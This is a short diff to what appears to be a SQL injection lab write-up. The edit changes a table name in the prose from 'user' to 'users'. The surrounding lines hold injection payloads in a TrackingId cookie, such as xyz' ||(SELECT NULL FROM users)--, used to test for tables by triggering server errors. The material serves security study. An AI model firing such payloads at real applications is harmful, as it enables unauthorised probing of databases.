@@ -107,7 +107,7 @@ TrackingId=xyz' || (SELECT NULL)--    (Internal Server Error)
 ```
 TrackingId=xyz' ||(SELECT NULL from dual)--
 ```
-- Here we will try to prove that the `user` table is exist but it will respond with an `Internal Server Error`.
+- Here we will try to prove that the `users` table is exist but it will respond with an `Internal Server Error`.
 ```
 TrackingId=xyz' ||(SELECT NULL FROM users)--
 ```
